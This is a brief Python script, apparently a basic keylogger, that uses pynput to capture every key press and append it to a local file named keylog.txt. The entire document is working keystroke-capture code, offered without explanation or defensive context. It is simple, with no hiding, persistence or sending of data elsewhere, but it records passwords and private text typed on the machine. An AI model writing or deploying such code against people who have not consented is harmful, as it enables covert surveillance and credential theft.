from pynput.keyboard import Listener


def writefile(key):
    letter = str(key)
    with open("keylog.txt","a") as f:
        f.write(letter)

with Listener(on_press=writefile) as l:
    l.join()